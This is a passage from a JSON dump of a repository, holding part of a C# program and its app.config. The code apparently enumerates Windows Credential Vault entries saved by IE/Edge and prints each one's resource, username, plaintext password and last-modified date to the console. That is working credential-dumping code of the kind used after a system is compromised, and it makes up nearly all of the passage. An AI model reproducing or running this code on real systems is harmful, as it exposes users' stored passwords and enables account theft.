IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);\r\n                        // Fetch the credential from the authenticator element\r\n                        object cred = GetVaultElementValue(pAuthenticatorElement);\r\n                        object packageSid = null;\r\n                        if (pPackageSid != IntPtr.Zero && pPackageSid != null)\r\n                        {\r\n                            packageSid = GetVaultElementValue(pPackageSid);\r\n                        }\r\n                        if (cred != null) // Indicates successful fetch\r\n                        {\r\n                            //Console.WriteLine(\"--- IE/Edge Credential ---\");\r\n                            Console.WriteLine(\"\\tVault Type   : {0}\", vaultType);\r\n                            object resource = GetVaultElementValue(pResourceElement);\r\n                            if (resource != null)\r\n                            {\r\n                                Console.WriteLine(\"\\tResource     : {0}\", resource);\r\n                            }\r\n                            object identity = GetVaultElementValue(pIdentityElement);\r\n                            if (identity != null)\r\n                            {\r\n                                Console.WriteLine(\"\\tIdentity     : {0}\", identity);\r\n                            }\r\n                            if (packageSid != null)\r\n                            {\r\n                                Console.WriteLine(\"\\tPacakgeSid  : {0}\", packageSid);\r\n                            }\r\n                            Console.WriteLine(\"\\tCredential   : {0}\", cred);\r\n                            // Stupid datetime\r\n                            Console.WriteLine(\"\\tLastModified : {0}\", System.DateTime.FromFileTimeUtc((long)lastModified));\r\n                            Console.WriteLine();\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n"
        },
        {
          "name": "app.config",
          "type": "blob",
          "size": 0.115234375,
          "content": "<?xml version=\"1.0\"?>\r\n<configuration>\r\n\t<startup><supportedRuntime version=\"v2.0.50727\"/></startup></configuration>\r\n"
        }
      ]
    }
  ]
}